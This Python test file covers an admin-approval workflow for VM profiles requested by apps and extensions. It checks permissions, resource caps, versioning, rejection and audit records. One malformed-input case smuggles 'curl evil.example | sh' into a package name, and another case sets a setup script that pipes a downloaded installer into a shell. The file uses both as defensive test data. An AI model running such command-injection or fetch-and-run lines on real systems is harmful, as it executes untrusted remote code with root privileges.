"""VM profile requests: an app or an extension asks, and nothing runs until an org admin approves.

A VM runs nothing as root that an org admin has not approved, and a
profile's packages and setup script run as root when its layer is built.
So an app asks with its own token, for itself only; an extension asks
through its manifest's `vm`, once per organisation. An org admin approves
the exact version they read — it becomes a profile, within the caps — or
rejects it; a changed request is pending again, and the VM keeps what was
last approved until then. Every step is in the audit trail
(`docs/service-identity.md` §12.3).
"""

from __future__ import annotations

import pytest

from tests.cloud_world import CloudOrg, make_super_admin, shipped, token_for, upload
from tests.conftest import audit_rows

pytestmark = pytest.mark.anyio

#: Chromium and Playwright's MCP server: the worked example of the docs.
BROWSER = {
    'memory_mib': 4096,
    'normal_memory_mib': 2048,
    'vcpus': 2,
    'packages': {'apt': ['chromium', 'fonts-liberation'], 'npm': ['@playwright/mcp@0.0.41']},
    'setup_script': 'ln -sf /usr/bin/chromium /usr/local/bin/chromium-browser\n',
}
#: The same, as an extension's manifest spells it.
MANIFEST_VM = {
    'memoryMib': 4096,
    'vcpus': 2,
    'packages': {'apt': ['chromium'], 'npm': ['@playwright/mcp@0.0.41']},
    'setupScript': 'ln -sf /usr/bin/chromium /usr/local/bin/chromium-browser\n',
}
EXTENSION = 'acme.browser'


@pytest.fixture
async def acme(client) -> CloudOrg:
    return await CloudOrg(client).create()


class Bot:
    """An app of the organisation, holding its own token."""

    def __init__(self, client, acme: CloudOrg) -> None:
        self.client = client
        self.acme = acme
        self.id = ''
        self.token: dict[str, str] = {}

    async def register(self, name: str = 'Review bot') -> Bot:
        app = await self.acme.app(name)
        self.id = app.client_id
        self.token = await self.acme.app_token(app)
        return self

    async def ask(self, body: dict, expect: int = 201) -> dict:
        response = await self.client.put(f'/apps/{self.id}/vm-profile-request', json=body, headers=self.token)
        assert response.status_code == expect, response.text
        return dict(response.json())

    async def request(self) -> dict:
        response = await self.client.get(f'/apps/{self.id}/vm-profile-request', headers=self.token)
        assert response.status_code == 200, response.text
        return dict(response.json())

    async def profile(self) -> dict:
        response = await self.client.get(f'/apps/{self.id}/vm-profile', headers=self.token)
        assert response.status_code == 200, response.text
        return dict(response.json())


@pytest.fixture
async def bot(client, acme) -> Bot:
    return await Bot(client, acme).register()


def _requests(acme: CloudOrg) -> str:
    return f'/portal/orgs/{acme.org_id}/vm-profile-requests'


async def _listed(client, acme: CloudOrg, headers: dict[str, str] | None = None) -> list[dict]:
    response = await client.get(_requests(acme), headers=headers or acme.admin)
    assert response.status_code == 200, response.text
    return list(response.json()['requests'])


async def _approve(client, acme: CloudOrg, request: dict, expect: int = 200, **kwargs) -> dict:
    response = await client.post(
        f'{_requests(acme)}/{request["id"]}/approve',
        json={'version': request['version']},
        headers=kwargs.get('headers', acme.admin),
    )
    assert response.status_code == expect, response.text
    return dict(response.json())


async def _reject(client, acme: CloudOrg, request: dict, reason: str | None = None, expect: int = 200) -> dict:
    response = await client.post(
        f'{_requests(acme)}/{request["id"]}/reject', json={'reason': reason}, headers=acme.admin
    )
    assert response.status_code == expect, response.text
    return dict(response.json())


class TestAnAppAsks:
    async def test_a_request_is_pending_and_changes_nothing(self, client, acme, bot):
        before = await bot.profile()

        asked = await bot.ask(BROWSER)

        assert asked['state'] == 'pending'
        assert asked['subject'] == {'kind': 'app', 'id': bot.id, 'name': 'Review bot'}
        assert asked['requested_by'] == {'kind': 'app', 'id': bot.id}
        assert asked['requested']['packages'] == {
            'apt': ['chromium', 'fonts-liberation'],
            'pip': [],
            'npm': ['@playwright/mcp@0.0.41'],
        }
        assert asked['requested']['idle_before_pause_s'] == 10, 'a value left out is the Standard one'
        assert asked['within_caps'] is True
        assert asked['profile_id'] is None
        assert await bot.profile() == before
        assert before['profile_name'] == 'Standard'
        assert before['packages'] == {'apt': [], 'pip': [], 'npm': []}

    async def test_it_reads_its_request_back(self, bot):
        asked = await bot.ask(BROWSER)

        assert await bot.request() == asked

    async def test_none_yet_is_a_404(self, client, bot):
        response = await client.get(f'/apps/{bot.id}/vm-profile-request', headers=bot.token)

        assert response.status_code == 404

    async def test_the_same_request_again_is_unchanged(self, bot):
        first = await bot.ask(BROWSER)
        again = await bot.ask(BROWSER, expect=200)

        assert again['version'] == first['version']
        assert again['requested_at'] == first['requested_at']

    async def test_only_the_app_itself_asks(self, client, acme, bot):
        other = await Bot(client, acme).register('Other bot')
        member_id, member = await acme.person('ada@acme.com')

        as_other = await client.put(f'/apps/{bot.id}/vm-profile-request', json=BROWSER, headers=other.token)
        as_admin = await client.put(f'/apps/{bot.id}/vm-profile-request', json=BROWSER, headers=acme.admin)
        as_member = await client.put(f'/apps/{bot.id}/vm-profile-request', json=BROWSER, headers=member)
        reading = await client.get(f'/apps/{bot.id}/vm-profile', headers=other.token)

        assert (as_other.status_code, as_admin.status_code, as_member.status_code) == (403, 403, 403)
        assert reading.status_code == 403
        assert await _listed(client, acme) == []

    async def test_a_service_cannot_ask_for_an_app(self, client, acme, bot):
        service = await shipped(client, 'acme.helper')
        token = await token_for(client, service, organisation=acme.org_id)

        response = await client.put(f'/apps/{bot.id}/vm-profile-request', json=BROWSER, headers=token)

        assert response.status_code in (401, 403)

    async def test_nobody_is_a_401(self, client, bot):
        response = await client.put(f'/apps/{bot.id}/vm-profile-request', json=BROWSER)

        assert response.status_code == 401

    async def test_more_than_the_caps_is_refused_at_once(self, client, bot):
        response = await client.put(
            f'/apps/{bot.id}/vm-profile-request', json={**BROWSER, 'memory_mib': 65536}, headers=bot.token
        )

        assert response.status_code == 400
        assert '8192' in response.json()['detail']

    @pytest.mark.parametrize(
        'body',
        [
            {'packages': {'apt': ['chromium; curl evil.example | sh']}},
            {'setup_script': 'x' * 65537},
            {'memory_mib': 2048, 'normal_memory_mib': 4096},
            {'name': 'Mine', **BROWSER},
            {'setupScript': 'echo'},
        ],
    )
    async def test_a_malformed_request_is_refused(self, client, bot, body):
        response = await client.put(f'/apps/{bot.id}/vm-profile-request', json=body, headers=bot.token)

        assert response.status_code == 422


class TestTheAdminSeesIt:
    async def test_with_exactly_what_would_run(self, client, acme, bot):
        asked = await bot.ask(BROWSER)

        [listed] = await _listed(client, acme)

        assert listed == asked
        assert listed['requested']['setup_script'] == BROWSER['setup_script']
        assert len(listed['packages_version']) == 32

    async def test_only_the_organisations_admins(self, client, acme, bot):
        await bot.ask(BROWSER)
        _, member = await acme.person('ada@acme.com')
        other = await CloudOrg(client, 'globex').create()

        assert (await client.get(_requests(acme), headers=member)).status_code == 403
        assert (await client.get(_requests(acme), headers=other.admin)).status_code == 403
        assert await _listed(client, other) == []

    async def test_a_super_admin_in_any_organisation(self, client, acme, bot):
        await bot.ask(BROWSER)
        other = await CloudOrg(client, 'globex').create()
        await make_super_admin(other.admin_id)

        [listed] = await _listed(client, acme, headers=other.admin)
        approved = await _approve(client, acme, listed, headers=other.admin)

        assert approved['decided_by'] == {'kind': 'person', 'id': other.admin_id, 'acting_as': 'super_admin'}

    async def test_pending_first(self, client, acme, bot):
        first = await bot.ask(BROWSER)
        await _reject(client, acme, first)
        other = await Bot(client, acme).register('Other bot')
        second = await other.ask({'vcpus': 2})

        listed = await _listed(client, acme)

        assert [r['id'] for r in listed] == [second['id'], first['id']]


class TestApproving:
    async def test_it_becomes_the_apps_profile(self, client, acme, bot):
        asked = await bot.ask(BROWSER)

        approved = await _approve(client, acme, asked)
        profile = await bot.profile()

        assert approved['state'] == 'approved'
        assert approved['decided_by'] == {'kind': 'person', 'id': acme.admin_id, 'acting_as': 'org_admin'}
        assert approved['decided_at'] is not None
        assert profile['profile_id'] == approved['profile_id']
        assert profile['profile_name'] == 'App: Review bot'
        assert profile['packages']['npm'] == ['@playwright/mcp@0.0.41']
        assert profile['setup_script'] == BROWSER['setup_script']
        assert (profile['memory_mib'], profile['normal_memory_mib'], profile['vcpus']) == (4096, 2048, 2)
        overview = (await client.get(f'/portal/orgs/{acme.org_id}/vm-profiles', headers=acme.admin)).json()
        [made] = [p for p in overview['profiles'] if p['id'] == approved['profile_id']]
        assert made['packages_version'] == approved['packages_version'], "Fleet's layer is the one approved"
        assert {'id': bot.id, 'name': 'Review bot', 'vm_profile_id': made['id']} in overview['apps']

    async def test_a_changed_request_is_pending_again_and_the_vm_keeps_what_was_approved(self, client, acme, bot):
        approved = await _approve(client, acme, await bot.ask(BROWSER))

        changed = await bot.ask({**BROWSER, 'setup_script': 'curl https://example.com/install.sh | sh\n'})
        profile = await bot.profile()

        assert changed['state'] == 'pending'
        assert changed['version'] != approved['version']
        assert (changed['decided_by'], changed['decided_at']) == (None, None)
        assert changed['profile_id'] == approved['profile_id']
        assert profile['setup_script'] == BROWSER['setup_script']

    async def test_approving_again_replaces_the_profile_in_place(self, client, acme, bot):
        first = await _approve(client, acme, await bot.ask(BROWSER))
        changed = await bot.ask({**BROWSER, 'vcpus': 3})

        second = await _approve(client, acme, changed)
        overview = (await client.get(f'/portal/orgs/{acme.org_id}/vm-profiles', headers=acme.admin)).json()

        assert second['profile_id'] == first['profile_id']
        assert (await bot.profile())['vcpus'] == 3
        assert [p['name'] for p in overview['profiles']] == ['Standard', 'App: Review bot']

    async def test_a_version_that_is_not_the_latest_is_refused(self, client, acme, bot):
        read = await bot.ask(BROWSER)
        await bot.ask({**BROWSER, 'vcpus': 3})

        await _approve(client, acme, read, expect=409)

        assert (await bot.profile())['profile_name'] == 'Standard'

    async def test_once_only(self, client, acme, bot):
        asked = await bot.ask(BROWSER)
        await _approve(client, acme, asked)

        await _approve(client, acme, asked, expect=409)

    async def test_a_cap_lowered_since_refuses_it(self, client, acme, bot):
        asked = await bot.ask(BROWSER)
        await make_super_admin(acme.admin_id)
        caps = await client.put('/portal/vm-caps', json={'max_memory_mib': 2048, 'max_vcpus': 4}, headers=acme.admin)
        assert caps.status_code == 200, caps.text

        [listed] = await _listed(client, acme)
        refused = await _approve(client, acme, asked, expect=400)

        assert listed['within_caps'] is False
        assert '2048' in refused['detail']
        assert (await bot.profile())['profile_name'] == 'Standard'

    async def test_a_name_an_admin_took_gets_a_number(self, client, acme, bot):
        response = await client.post(
            f'/portal/orgs/{acme.org_id}/vm-profiles', json={'name': 'App: Review bot'}, headers=acme.admin
        )
        assert response.status_code == 201, response.text

        await _approve(client, acme, await bot.ask(BROWSER))

        assert (await bot.profile())['profile_name'] == 'App: Review bot (2)'

    async def test_an_unknown_request_is_a_404(self, client, acme):
        response = await client.post(f'{_requests(acme)}/nope/approve', json={'version': 'x'}, headers=acme.admin)

        assert response.status_code == 404


class TestRejecting:
    async def test_nothing_changes_and_the_reason_is_kept(self, client, acme, bot):
        asked = await bot.ask(BROWSER)

        rejected = await _reject(client, acme, asked, 'Use the shared browser profile')

        assert rejected['state'] == 'rejected'
        assert rejected['reason'] == 'Use the shared browser profile'
        assert (await bot.profile())['profile_name'] == 'Standard'
        assert (await bot.request())['state'] == 'rejected'

    async def test_the_same_request_again_stays_rejected(self, client, acme, bot):
        await _reject(client, acme, await bot.ask(BROWSER))

        again = await bot.ask(BROWSER, expect=200)

        assert again['state'] == 'rejected'

    async def test_a_changed_one_is_pending_again(self, client, acme, bot):
        await _reject(client, acme, await bot.ask(BROWSER))

        changed = await bot.ask({**BROWSER, 'packages': {'apt': ['chromium']}})

        assert (changed['state'], changed['reason']) == ('pending', None)

    async def test_an_approved_one_is_not_rejected_after(self, client, acme, bot):
        asked = await bot.ask(BROWSER)
        await _approve(client, acme, asked)

        await _reject(client, acme, asked, expect=409)

    async def test_a_rejected_one_may_still_be_approved(self, client, acme, bot):
        asked = await bot.ask(BROWSER)
        await _reject(client, acme, asked)

        approved = await _approve(client, acme, asked)

        assert approved['state'] == 'approved'
        assert approved['reason'] is None


class TestAnExtensionAsks:
    async def test_through_its_manifest_once_per_organisation(self, client, acme):
        await shipped(client, EXTENSION, vm=MANIFEST_VM)
        other = await CloudOrg(client, 'globex').create()

        [here] = await _listed(client, acme)
        [there] = await _listed(client, other)

        assert here['subject'] == {'kind': 'extension', 'id': EXTENSION, 'name': EXTENSION}
        assert here['state'] == there['state'] == 'pending'
        assert here['requested_by']['kind'] == 'service'
        assert here['requested']['packages']['npm'] == ['@playwright/mcp@0.0.41']
        assert here['requested']['memory_mib'] == 4096
        assert here['version'] == there['version']

    async def test_approving_makes_a_profile_the_admin_assigns(self, client, acme):
        await shipped(client, EXTENSION, vm=MANIFEST_VM)
        group = await acme.group('Research')
        [asked] = await _listed(client, acme)

        approved = await _approve(client, acme, asked)
        overview = (await client.get(f'/portal/orgs/{acme.org_id}/vm-profiles', headers=acme.admin)).json()
        [made] = [p for p in overview['profiles'] if p['id'] == approved['profile_id']]

        assert made['name'] == f'Extension: {EXTENSION}'
        assert made['packages']['apt'] == ['chromium']
        assert all(g['vm_profile_id'] is None for g in overview['groups']), 'assigning is the admin’s'
        assigned = await client.put(
            f'/portal/orgs/{acme.org_id}/groups/{group}/vm-profile',
            json={'profile_id': made['id']},
            headers=acme.admin,
        )
        assert assigned.status_code == 204

    async def test_a_new_version_that_asks_otherwise_is_pending_again(self, client, acme):
        service = await shipped(client, EXTENSION, vm=MANIFEST_VM)
        [asked] = await _listed(client, acme)
        approved = await _approve(client, acme, asked)

        assert (await upload(client, service, EXTENSION, '1.1.0', vm={**MANIFEST_VM, 'vcpus': 4})).status_code == 200
        [changed] = await _listed(client, acme)
        overview = (await client.get(f'/portal/orgs/{acme.org_id}/vm-profiles', headers=acme.admin)).json()
        [kept] = [p for p in overview['profiles'] if p['id'] == approved['profile_id']]

        assert changed['state'] == 'pending'
        assert changed['requested']['vcpus'] == 4
        assert kept['vcpus'] == 2, 'the profile keeps what was approved'

    async def test_a_version_that_asks_nothing_drops_the_request_and_keeps_the_profile(self, client, acme):
        service = await shipped(client, EXTENSION, vm=MANIFEST_VM)
        approved = await _approve(client, acme, (await _listed(client, acme))[0])

        assert (await upload(client, service, EXTENSION, '1.1.0')).status_code == 200
        overview = (await client.get(f'/portal/orgs/{acme.org_id}/vm-profiles', headers=acme.admin)).json()

        assert await _listed(client, acme) == []
        assert approved['profile_id'] in [p['id'] for p in overview['profiles']]

    async def test_a_malformed_vm_is_refused_at_upload(self, client):
        service = await shipped(client, EXTENSION)

        status = (await upload(client, service, EXTENSION, '1.1.0', vm={'packages': {'apt': ['a b']}})).status_code
        snake = (await upload(client, service, EXTENSION, '1.2.0', vm={'memory_mib': 4096})).status_code

        assert (status, snake) == (400, 400)

    async def test_its_service_reads_the_state_and_the_profile(self, client, acme):
        service = await shipped(client, EXTENSION, vm=MANIFEST_VM)
        token = await token_for(client, service, organisation=acme.org_id)

        pending = (await client.get('/service-vm-profile', headers=token)).json()
        approved = await _approve(client, acme, pending['request'])
        group = await acme.group('Research')
        await client.put(
            f'/portal/orgs/{acme.org_id}/groups/{group}/vm-profile',
            json={'profile_id': approved['profile_id']},
            headers=acme.admin,
        )
        after = (await client.get('/service-vm-profile', headers=token)).json()

        assert pending['org_id'] == acme.org_id
        assert pending['extension_id'] == EXTENSION
        assert (pending['request']['state'], pending['profile']) == ('pending', None)
        assert pending['assigned'] == {'groups': 0, 'apps': 0}
        assert after['request']['state'] == 'approved'
        assert after['profile']['packages']['npm'] == ['@playwright/mcp@0.0.41']
        assert after['assigned'] == {'groups': 1, 'apps': 0}

    async def test_a_service_whose_extension_asks_nothing(self, client, acme):
        service = await shipped(client, 'acme.quiet')
        token = await token_for(client, service, organisation=acme.org_id)

        answer = (await client.get('/service-vm-profile', headers=token)).json()

        assert answer == {
            'org_id': acme.org_id,
            'extension_id': 'acme.quiet',
            'request': None,
            'profile': None,
            'assigned': {'groups': 0, 'apps': 0},
        }

    async def test_only_with_a_service_token(self, client, acme, bot):
        assert (await client.get('/service-vm-profile', headers=acme.admin)).status_code == 401
        assert (await client.get('/service-vm-profile', headers=bot.token)).status_code == 401


class TestTheAuditTrail:
    async def test_asking_approving_and_rejecting_are_recorded(self, client, acme, bot):
        asked = await bot.ask(BROWSER)
        await _approve(client, acme, asked)
        changed = await bot.ask({**BROWSER, 'vcpus': 3})
        await _reject(client, acme, changed, 'No')

        rows = [r for r in audit_rows(target_type='vm_profile_request') if r['target_id'] == asked['id']]
        by_route = {(r['method'], r['route'].rsplit('/', 1)[-1], r['detail'].get('state')): r for r in rows}

        ask = by_route[('PUT', 'vm-profile-request', 'pending')]
        assert ask['actor_user_id'] == f'app:{bot.id}'
        assert ask['detail']['packages_version'] == asked['packages_version']
        approve = by_route[('POST', 'approve', 'approved')]
        assert approve['actor_user_id'] == acme.admin_id
        assert approve['detail']['subject'] == f'app:{bot.id}'
        assert approve['detail']['version'] == asked['version']
        reject = by_route[('POST', 'reject', 'rejected')]
        assert reject['detail']['version'] == changed['version']
        assert 'No' not in str(reject['detail']), "the reason is kept on the request, not copied into the trail"

    async def test_a_refusal_is_recorded_too(self, client, acme, bot):
        _, member = await acme.person('ada@acme.com')
        asked = await bot.ask(BROWSER)

        await client.post(
            f'{_requests(acme)}/{asked["id"]}/approve', json={'version': asked['version']}, headers=member
        )

        assert any(r['outcome'] != 'success' and r['route'].endswith('/approve') for r in audit_rows(method='POST'))


class TestARemovedApp:
    async def test_takes_its_request_with_it(self, client, acme, bot):
        await bot.ask(BROWSER)

        response = await client.delete(f'/portal/apps/{bot.id}', headers=acme.admin)

        assert response.status_code == 204, response.text
        assert await _listed(client, acme) == []
